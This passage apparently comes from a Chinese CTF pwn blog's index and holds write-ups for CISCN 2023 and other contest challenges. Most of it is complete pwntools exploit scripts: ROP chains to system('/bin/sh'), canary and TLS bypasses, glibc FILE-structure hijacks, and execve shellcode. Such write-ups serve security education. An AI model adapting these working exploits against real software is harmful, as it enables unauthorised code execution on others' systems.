libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]ioaddr=heap_addr+0x6e0flag_addr = heap_addr+0x728next_chain = 0fake_IO_FILE = p64(0)+p64(0)+p64(0)+p64(heap_addr+0x730)+p64(0)*2+p64(1)+p64(0)*4+b&#x27;./flag\\x00\\x00&#x27;fake_IO_FILE +=p64(0)fake_IO_FILE +=p64(0)fake_IO_FILE +=p64(1)+p64(0)fake_IO_FILE +=p64(setcontext_addr)fake_IO_FILE +=p64(gadget_addr)#call addrfake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)  # _chainfake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_addr+0x200)  # _lock = writable addressfake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\\x00&#x27;)fake_IO_FILE +=p64(0)+p64(0)+p64(ioaddr) #rax1fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)  # _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc_addr+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10fake_IO_FILE +=p64(0)*3+p64(libc_addr+0x2160c0+0x10)+p64(heap_addr+0x740)+p64(0)fake_IO_FILE += p64(heap_addr+0x7e0)+p64(ret_addr)  # rax2fake_IO_FILE += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)fake_IO_FILE += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(heap_addr+0x1000)+p64(rdx_addr)+p64(0x100)+p64(read_addr)fake_IO_FILE += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(heap_addr+0x1000)+p64(rdx_addr)+p64(0x100)+p64(write_addr)edit(1,len(fake_IO_FILE),fake_IO_FILE)payload = cyclic(0x508)+p64(0x300)edit(5,len(payload),payload)# gdb.attach(io,&#x27;b *$rebase(0x143A)&#x27;)# pause(0)add(0x1000)#6# pause()io.recv()io.recv()\n\n","categories":["堆"]},{"title":"2023Ciscn华东南分区赛","url":"/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/","content":"前言第一次打awdp赛制的比赛 对于fix和attack节奏的把控有了一些理解 还学到了一点fix的小技巧 当然attack的题目也学到了很多东西 来做一个总结\nlogin\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char buf[240]; // [rsp+10h] [rbp-F0h] BYREF  sub_4011FB(a1, a2, a3);  sub_40127B();  puts(&quot;Welcome to CISCN 2023!&quot;);  puts(&quot;Enter your password:&quot;);  read(0, buf, 0x90uLL);  puts(&quot;Login failed...&quot;);  puts(&quot;Try again!&quot;);  puts(&quot;Enter your password:&quot;);  read(0, &amp;unk_404060, 0x90uLL);  return 0LL;&#125;\n\n可以溢出0x10字节 同时可以往bss段写入数据 说实话 这种考点是我玩剩下的 出过很多这种类型的题目 这题很快就拿下了\n由于read函数的rsi是通过rbp寄存器来索引的 我们只需要覆盖rbp为bss段地址 随后控制retaddr为read函数的参数赋值起始地址 就可以达成任意写 随后就是往bss段上写rop链泄露libc地址 然后利用pop rbp继续控制rbp的地址 然后再次跳转实现任意写 最后构造system\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;175.20.26.11&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Enter your password:&quot;)bss_addr = elf.bss(0x800)ptr_addr = 0x401316rdi_addr = 0x00000000004013d3leave_addr = 0x000000000040136eret_addr = 0x000000000040101arbp_addr = 0x00000000004011bdputs_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.sym[&#x27;puts&#x27;]payload = cyclic(0xf0)+p64(bss_addr+0xf0)+p64(ptr_addr)io.send(payload)io.recvuntil(&quot;Enter your password:&quot;)payload = b&#x27;aaaa&#x27;# gdb.attach(io,&#x27;b *0x40136F&#x27;)# pause(0)io.send(payload)# pause()payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(elf.bss(0xbf8))+p64(ptr_addr)+p64(rbp_addr)payload = payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)payload = b&#x27;aaaa&#x27;io.send(payload)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)payload = payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(elf.bss(0xb00))+p64(leave_addr)io.send(payload)payload = b&#x27;aaaa&#x27;# gdb.attach(io,&#x27;b *0x40136F&#x27;)# pause(0)io.send(payload)# pause()io.interactive()\n\n​           \nwargame这题的代码量很大 需要慢慢审计 最后是在adjust weapon中 发现了一个函数可以往堆地址写入数据 并且是用for循环来的   \n将for循环的次数修改为0次后就通过了check\nchar __fastcall sub_2E18(__int64 a1)&#123;  char result; // al  int i; // [rsp+1Ch] [rbp-4h]  if ( dword_81E4 )    return puts(&quot;Error.&quot;);  result = printf(&quot;Info: &quot;);  for ( i = 0; i &lt;= 9; ++i )  &#123;    result = sub_15FF(a1 + 16 + 32 * i + 16LL, 16LL) == 0;    if ( result )      break;  &#125;  dword_81E4 = 1;  return result;&#125;\n\nnotepad2.35的一道堆 存在UAF漏洞 \nint sub_16B0()&#123;  int result; // eax  char *v1; // rbx  __printf_chk(1LL, &quot;page: &quot;);  result = choice();  if ( result &lt;= 0xE )  &#123;    v1 = &amp;unk_4040 + 16 * result;    if ( *v1 )    &#123;      free(*v1);      *(v1 + 2) = 0;      result = puts(&quot;Success~&quot;);    &#125;  &#125;  return result;&#125;\n\n置零的是存放size的指针 将其修改为v1 置零堆块指针即可成功fix\nattack的话 这题除了UAF之外 edit函数中还存在一个漏洞 \nint sub_1790()&#123;  unsigned int v0; // eax  char *v1; // rbx  __printf_chk(1LL, &quot;page: &quot;);  v0 = choice();  if ( v0 &gt; 0xE )    return puts(&quot;The notepad don&#x27;t have this page!&quot;);  v1 = &amp;unk_4040 + 16 * v0;  if ( !*v1 )    return puts(&quot;The notepad don&#x27;t have this page!&quot;);  **v1 = 0LL;  if ( !*(v1 + 2) )    return puts(&quot;The notepad don&#x27;t have this page!&quot;);  __printf_chk(1LL, &quot;date: &quot;);  sub_13E0(*v1);  __printf_chk(1LL, &quot;content: &quot;);  return sub_13E0((*v1 + 16LL));&#125;\n\n可以看到在检查size指针之前 就对chunk的前0x10字节清空了 这意味着我们可以在释放chunk到tcachebin后 借此来清空key域 以此来实现double free\n随后就是2.35的io链利用\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;175.20.26.10&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(size,data,payload):    io.recvuntil(&quot;&gt;&gt; &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;date: &quot;)    io.sendline(data)    io.recvuntil(&quot;content: &quot;)    io.sendline(payload)def show(index):    io.recvuntil(&quot;&gt;&gt; &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;page: &quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;&gt;&gt; &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;page: &quot;)    io.sendline(str(index))def edit(index):    io.recvuntil(&quot;&gt;&gt; &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;page: &quot;)    io.sendline(str(index))for i in range(8):    add(0x80,b&#x27;aaaa&#x27;,b&#x27;aaaa&#x27;)delete(1)show(1)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))&gt;&gt;8success(&quot;heap_addr :&quot;+hex(heap_addr))for i in range(6):    delete(i+2)delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x219ce0success(&quot;libc_addr :&quot;+hex(libc_addr))add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)delete(9)delete(8)edit(8)delete(8)stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]key = heap_addr success(&quot;key:&quot;+hex(key))# ptr_addr = libc_addr + 0x2282c0# success(hex(ptr_addr))# add(0xf0,p64(key^ptr_addr),&#x27;aaaa&#x27;)# add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)# success(hex(ptr_addr))# fake_addr = (heap_addr*0x1000)# fake_addr += 0x9b0# dyn_addr = libc_addr + 0x218bc0# a_addr = libc_addr + 0x265890# b_addr = libc_addr + 0x2282b0# add(0xf0,p64(dyn_addr)+p64(fake_addr),p64(a_addr)+p64(b_addr))# onegadget_addr = libc_addr# payload = p64(0)*3 + p64(fake_addr)# payload = payload.ljust(0x38,b&#x27;\\x00&#x27;)+p64(fake_addr+0x58)+p64(8)+p64(onegadget_addr)# payload = payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(fake_addr+0x40)# payload = payload.ljust(0x110,b&#x27;\\x00&#x27;)+p64(fake_addr+0x48)# payload = payload.ljust(0x31c-0x10,b&#x27;\\x00&#x27;)+p64(0x1c)# add(0x100,payload,p64(0))# success(hex(fake_addr))# debug()# chunk_addr = (heap_addr*0x1000)+0x7a0gadget_addr = libc_addr + 0x00000000001675b0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_r12_addr = libc_addr + 0x000000000011f497ret_addr = libc_addr + 0x0000000000029cd6binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]io_lock = libc_addr + 0x21ba60_IO_wfile_jumps = libc_addr + libc.sym[&#x27;_IO_wfile_jumps&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]heap_addr = heap_addr *0x1000fake_FILE_addr = heap_addr + 0x9d0wide = heap_addr + 0xaf0fake_FILE = b&#x27;/bin/sh\\x00&#x27;fake_FILE += p64(0)*13fake_FILE += p64(2) + p64(0xffffffffffffffff)fake_FILE += p64(00) + p64(io_lock)fake_FILE += p64(0xffffffffffffffff) + p64(0)fake_FILE += p64(wide) + p64(0)fake_FILE += p64(0)*2fake_FILE += p64(1)fake_FILE += p64(0)*2 + p64(_IO_wfile_jumps+0x30)add(0x100,&#x27;aaaa&#x27;, fake_FILE+b&#x27;\\n&#x27;) #10fake_FILE2 = p64(0)*2 + p64(1) + p64(2)+p64(3)fake_FILE2 += p64(0)*22 + p64(wide+0xe8-0x18)fake_FILE2 += p64(wide+0xe8-0x18)+p64(system_addr)add(0x100,&#x27;aaaa&#x27;, fake_FILE2+b&#x27;\\n&#x27;) #11IO_list_all = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]add(0xf0, p64(key^IO_list_all),&#x27;1&#x27;) #12add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;) #13add(0xf0, p64(fake_FILE_addr),&#x27;aaaa&#x27;) #14io.recvuntil(&quot;&gt;&gt; &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1212)&#x27;)# pause(0)io.sendline(b&#x27;5&#x27;)io.interactive()\n\nmasknote__int64 vuln()&#123;  __int64 result; // rax  char s[128]; // [rsp+0h] [rbp-80h] BYREF  memset(s, 0, sizeof(s));  printf(&quot;\\x1B[0;34mNice to meet you!\\n\\x1B[0m&quot;);  printf(&quot;\\x1B[0;32myour name:\\x1B[0m&quot;);  read(0, name, 0x80uLL);  printf(&quot;\\x1B[0;32mMask:\\x1B[0m&quot;);  read(0, Mask, 0x64uLL);  check_Mask(Mask);  sprintf(s, Mask, name);  printf(&quot;\\x1B[0;32myour Masked name:\\x1B[0m&quot;);  write(1, s, 0x80uLL);  printf(&quot;\\x1B[1;33mWelcome!\\n\\x1B[0m&quot;);  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    result = (unsigned int)choice;    if ( choice == 5 )      break;    switch ( choice )    &#123;      case 1:        add();        break;      case 2:        show();        break;      case 3:        edit();        break;      case 4:        delete();        break;    &#125;  &#125;  return result;&#125;\n\n看起来像一道堆题 但是实际是sprintf函数的利用 其如果使用%c可以打印空字符 就存在栈溢出 但是由于不能读入\\x00 所以只能覆盖retaddr 由于开局mmap了一个地址 权限是可写可读可执行 所以我们可以往其写入shellcode 随后利用栈溢出修改retaddr\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;175.20.26.208&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Idx:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size:&quot;)    io.sendline(str(size))def show(index):    io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Idx:&quot;)    io.sendline(str(index))def edit(index,payload):    io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Idx:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;context: &quot;)    io.send(payload)def delete(index):    io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Idx:&quot;)    io.sendline(str(index))io.recvuntil(&quot;your name:&quot;)io.send(b&#x27;aaaaaaaa&#x27;+b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;)io.recvuntil(&quot;Mask:&quot;)# gdb.attach(io,&#x27;b *0x401813&#x27;)# pause(0)leave_ret = 0x0000000000401392#0x50a37#4017A1payload = b&#x27;aa%34$s%126caa&#x27;+b&#x27;\\x08\\x80\\x80\\x80&#x27;io.send(payload)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2652e0success(&quot;libc_addr :&quot;+hex(libc_addr))# pause()io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)# gdb.attach(io,&#x27;b *0x4018EE&#x27;)# pause(0)io.sendline(b&#x27;5&#x27;)# pause()io.interactive()# io.send(&#x27;aaa&#x27;)# io.recvuntil(&quot;Mask:&quot;)# onegadget_addr = libc_addr + 0xebd52# gets_addr = libc_addr + libc.sym[&#x27;gets&#x27;]# payload = b&#x27;%110caaaaaaaaaaaaaaaaaa&#x27;+cyclic(0x8)+p64(gets_addr)# # gdb.attach(io,&#x27;b *0x4017FD&#x27;)# # pause(0)# io.send(payload)# # pause()# gdb.attach(io,&#x27;b *0x4018EE&#x27;)# pause(0)# io.sendline(b&#x27;5&#x27;)# pause()\n\ndbgnote这题fix的关键是溢出 经过代码审计发现有两处地方分别存在2字节溢出和1字节溢出 位于username的读入和chunk size的读入\n将其修改为无溢出即可通过check\n\n\n","categories":["wp"]},{"title":"2023天融信杯车联网比赛初赛","url":"/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/","content":"这次的比赛总共有三题pwn  两题出的比较新 一题就是考烂的伪随机数 这里就不收纳进入wp了\nTimeMachine\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *v3; // rsp  _QWORD *v4; // rbx  __int64 v6; // [rsp+8h] [rbp-38h] BYREF  unsigned __int8 i; // [rsp+16h] [rbp-2Ah]  unsigned __int8 v8; // [rsp+17h] [rbp-29h]  double v9; // [rsp+18h] [rbp-28h]  unsigned __int64 v10; // [rsp+20h] [rbp-20h]  unsigned __int64 v11; // [rsp+28h] [rbp-18h]  v11 = __readfsqword(0x28u);  v9 = 31137.31337;  ask_name(argc, argv, envp);  v8 = ask_number();  v3 = alloca(16 * ((8 * v8 + 30) / 0x10));  v10 = 16 * ((&amp;v6 + 7) &gt;&gt; 4);  for ( i = 0; i &lt; v8; ++i )    *(8LL * i + v10) = 0x40DE68540E410B63LL;  for ( i = 0; ; ++i )  &#123;    printf(&quot;-=-=-=-= CHALLENGE %03d =-=-=-=-\\n&quot;, i + 1);    v4 = (8LL * i + v10);    play_game();    *v4 = 0x40DE68540E410B63LL;    if ( i &gt;= v8 - 1 || !ask_again() )      break;  &#125;  for ( i = 0; i &lt; v8; ++i )  &#123;    if ( v9 &gt; *(8LL * i + v10) )      v9 = *(8LL * i + v10);  &#125;  puts(&quot;-=-=-=-= RESULT =-=-=-=-&quot;);  printf(&quot;Name: %s\\n&quot;, name);  HIBYTE(v6) = HIBYTE(v9);  printf(&quot;Best Score: %lf\\n&quot;, v9);  return 0;&#125;\n\n主要的逻辑就是利用gettimeofday来实现一个控制时间的小游戏 输入想要间隔的时间 然后两次输入任意字符来开启和终止计时 不过程序本身并没有漏洞 漏洞主要出现在完成一次游戏后 是否还要继续的函数\n_BOOL8 ask_again()&#123;  char v1[24]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;Play again? (Y/n) &quot;);  __isoc99_scanf(&quot;%s&quot;, v1);  readuntil(10LL);  return v1[0] != 110 &amp;&amp; v1[0] != 78;&#125;\n\n这里存在了一个栈溢出漏洞 但是由于程序本身开启了canary 所以我们需要想办法获取canary的值 这里当然是特别关注一下程序的几个输出函数 看看有没有机会泄露\n\n发现了这个printf函数的调用存在可疑点 其将rbp-0x48处的内容赋值给了rbp-0x58 我们通过gdb动调来查看一下\n\n可以看到相当于就是把canary赋值给了rsp指针指向的下一个字长处 这样的用意何在呢 可以看到随后就被赋值给了xmm0浮点数寄存器 这是printf函数利用%lf格式化字符输出数据的固定调用格式 会把调用时rsp的下一个字长内容输出\n只要我们在ask_time函数中输入的v4不符合指定格式 那么v4就不会被赋值 从而我们可以泄露出canary 在后续的栈溢出中构造rop链\n同时还有一点要注意的 由于是scanf引起的栈溢出 所以\\x20 也就是空格 是无法被读入的 而本题的got表都位于0x602000处 所以我们需要泄露libc_start_main的基址\n\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;123.127.164.29&quot;,27917)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.binary = elfcontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;x&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;16&#x27;)io.recvuntil(&quot;Time[sec]: &quot;)# gdb.attach(io,&#x27;b *0x40099F&#x27;)# pause(0)io.sendline(b&#x27;c&#x27;)# pause()io.recvuntil(&quot;Stop the timer as close to &quot;)t = io.recvuntil(&quot; &quot;,drop = True)canary = struct.pack(&quot;&lt;d&quot;, float(t))io.recvuntil(&quot;Press ENTER to start / stop the timer.&quot;)io.send(&#x27;\\n&#x27;)io.recvuntil(&quot;Timer started.&quot;)io.send(&#x27;\\n&#x27;)io.recvuntil(&quot;Play again? (Y/n) &quot;)puts_plt = elf.sym[&#x27;puts&#x27;]libc_start_main_got = 0x601ff0rdi_addr = 0x0000000000400e93ret_addr = 0x00000000004006a6back_addr = 0x40089Brop = ROP(elf)rop.puts(elf.got.__libc_start_main)rop.ask_again()payload = cyclic(0x18)+canary+cyclic(0x8)+p64(rdi_addr)+p64(libc_start_main_got)+p64(puts_plt)+p64(back_addr)# gdb.attach(io,&#x27;b *0x400916&#x27;)# pause(0)io.sendline(payload)# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x23fc0success(&quot;libc_addr :&quot;+hex(libc_addr))io.recvuntil(&quot;Play again? (Y/n) &quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))success(&quot;system_addr :&quot;+hex(system_addr))payload = cyclic(0x18)+canary+cyclic(0x8)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)# gdb.attach(io,&#x27;b *0x4008DB&#x27;)# pause(0)io.sendline(payload)# pause()io.interactive()\n\nguess这题的漏洞点和上题类似 不过考到了pthread_join线程函数带来的漏洞\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  unsigned __int64 v3; // rax  void *v4; // rsp  int i; // [rsp+8h] [rbp-20h] BYREF  int v7; // [rsp+Ch] [rbp-1Ch]  pthread_t newthread[3]; // [rsp+10h] [rbp-18h] BYREF  newthread[2] = __readfsqword(0x28u);  sub_13E8();  v7 = sub_1594();  v3 = 16 * ((8LL * v7 + 23) / 0x10uLL);  while ( &amp;i != (&amp;i - (v3 &amp; 0xFFFFFFFFFFFFF000LL)) )    ;  v4 = alloca(v3 &amp; 0xFFF);  if ( (v3 &amp; 0xFFF) != 0 )    *(&amp;i + (v3 &amp; 0xFFF) - 8) = *(&amp;i + (v3 &amp; 0xFFF) - 8);  newthread[1] = 16 * ((newthread + 7) &gt;&gt; 4);  sub_1552(a1);  for ( i = 0; i &lt; dword_4030; ++i )    sub_1485();  fflush(stdout);  puts(&quot;I don&#x27;t think you won the game if you made it until here ...&quot;);  puts(&quot;But maybe a threaded win can help?&quot;);  pthread_create(newthread, 0LL, start_routine, 0LL);  pthread_join(newthread[0], 0LL);  return 0LL;&#125;\n\n主要的逻辑都差不多 关键在于sub_1485这个函数\nif ( dword_4030 - 1 == dword_402C )  &#123;    puts(&quot;Sorry, that was the last guess!&quot;);    printf(&quot;You entered %lu but the right number was %lu\\n&quot;, v1, v2);  &#125;\n\n如果这是我们最后一次猜数字并且还猜错了 那么就会告诉我们正确的数字 注意了是用%lu输出的 来看一下汇编 会将rbp-0x18处的数据赋值给rsi寄存器 我们通过gdb动调来观察一下 如果我们不按要求输出数据 使得我们输入的数据为空 此时的rsi寄存器会被赋值成什么\n\n\n可以泄露elf的地址 由于开启了PIE 我们在不泄露libc地址的情况下很难构造rop链 这下子就可以构造了\n接着我们来说说pthread_create这个线程函数 其无非就是创建了一个新的线程 并且指定了新的线程从start_routine函数开始\n随后利用pthread_join函数 指定了在原本的线程结束后 开始执行新的线程\n在这里你可以注意到 两个函数的第一个参数newthread 是用来规定新线程的内存单元 也就是说新线程的内存空间是旧线程的栈\n而栈地址我们知道是由高地址到低地址的 TLS结构体的初始化 就会在高地址处  而start_routine函数提供了栈溢出的机会 那么我们就有机会溢出到tls结构体  由此里绕过canary 再加上我们前面泄露了elf的基址 接下来就是ret2libc的问题了\n旧线程的栈地址: \n\n新线程的栈地址 以及tls结构体存放的位置\n\n完整exp：\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;123.127.164.29&quot;,27917)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Enter the size : &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter the number of tries : &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter your guess : &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1507)&#x27;)# pause(0)# gdb.attach(io,&#x27;b *$rebase(0x16E0)&#x27;)# pause(0)io.sendline(b&#x27;c&#x27;)# pause()io.recvuntil(&quot;You entered &quot;)elf_addr = int(io.recvuntil(&quot; &quot;,drop = True),10)-0x1579success(&quot;elf_addr :&quot;+hex(elf_addr))io.recvuntil(&quot;But maybe a threaded win can help?&quot;)puts_got = elf_addr + elf.got[&#x27;puts&#x27;]puts_plt = elf_addr + elf.sym[&#x27;puts&#x27;]rdi_addr = elf_addr+0x0000000000001793back_addr = elf_addr + 0x1436ret_addr = elf_addr + 0x000000000000101apayload = cyclic(0x18)+p64(0x100)+cyclic(0x8)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(back_addr)payload = payload.ljust(0x858,b&#x27;\\x00&#x27;)+p64(0x100)io.sendline(payload)# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rax_addr = libc_addr + next(libc.search(asm(&quot;pop rax;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))syscall_addr = read_addr + 0x10io.recvuntil(&quot;&gt; &quot;)payload = cyclic(0x18)+p64(0x100)+cyclic(0x8)+p64(rax_addr)+p64(59)+p64(rdi_addr)+p64(binsh_addr)+p64(rsi_addr)+p64(0)+p64(syscall_addr)# gdb.attach(io,&#x27;b *$rebase(0x1484)&#x27;)# pause(0)io.sendline(payload)# pause()io.interactive()\n\n","categories":["wp"]},{"title":"2023Ciscn-dgbnote详解","url":"/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/","content":"2023Ciscn华东南分区赛遇到的一题 觉得题目的考点非常新颖和有趣 所以打算仔细研究一下\nsignal题目用到了singal函数  该函数可以捕捉对应的信号 并且调用指定的信号处理函数\n来看一下题目中所涉及到的两个single函数\nsignal(6, handler);signal(14, my_exit);\n\n第一个参数代表的是产生的信号 这里的6是SIGABRT 当进程非正常终止 调用abort函数的时候会触发\n14是SIGALRM 如果程序设置的alarm函数超时 就会触发\n下面是截取网上的大部分信号表格及其描述\n\n\n\nSignal\nDescription\n\n\n\nSIGABRT\n由调用abort函数产生，进程非正常退出\n\n\nSIGALRM\n用alarm函数设置的timer超时或setitimer函数设置的interval timer超时\n\n\nSIGBUS\n某种特定的硬件异常，通常由内存访问引起\n\n\nSIGCANCEL\n由Solaris Thread Library内部使用，通常不会使用\n\n\nSIGCHLD\n进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略\n\n\nSIGCONT\n当被stop的进程恢复运行的时候，自动发送\n\n\nSIGEMT\n和实现相关的硬件异常\n\n\nSIGFPE\n数学相关的异常，如被0除，浮点溢出，等等\n\n\nSIGFREEZE\nSolaris专用，Hiberate或者Suspended时候发送\n\n\nSIGHUP\n发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送\n\n\nSIGILL\n非法指令异常\n\n\nSIGINFO\nBSD signal。由Status Key产生，通常是CTRL+T。发送给所有Foreground Group的进程\n\n\nSIGINT\n由Interrupt Key产生，通常是CTRL+C或者DELETE。发送给所有ForeGround Group的进程\n\n\nSIGIO\n异步IO事件\n\n\nSIGIOT\n实现相关的硬件异常，一般对应SIGABRT\n\n\nSIGKILL\n无法处理和忽略。中止某个进程\n\n\nSIGLWP\n由Solaris Thread Libray内部使用\n\n\nSIGPIPE\n在reader中止之后写Pipe的时候发送\n\n\nSIGPOLL\n当某个事件发送给Pollable Device的时候发送\n\n\nSIGPROF\nSetitimer指定的Profiling Interval Timer所产生\n\n\nSIGPWR\n和系统相关。和UPS相关。\n\n\nSIGQUIT\n输入Quit Key的时候（CTRL+\\）发送给所有Foreground 